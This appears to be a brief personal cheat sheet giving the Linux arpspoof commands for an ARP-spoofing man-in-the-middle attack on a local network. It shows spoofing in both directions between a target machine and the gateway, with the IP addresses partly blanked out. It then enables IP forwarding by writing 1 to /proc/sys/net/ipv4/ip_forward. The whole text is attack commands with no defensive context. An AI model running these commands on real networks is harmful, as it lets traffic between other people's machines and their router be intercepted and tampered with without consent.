# ARP Spoofer - linux command

arpspoof -i eth0 -t 192.168.---.- 192.168.---.-

Target IP. Router can be a target machine.

> arpspoof -i <interface> -t <target> <gateway>
> arpspoof -i <interface> -t <gateway> <target>


Enable Port Forwarding:
echo 1 > /proc/sys/net/ipv4/ip_forward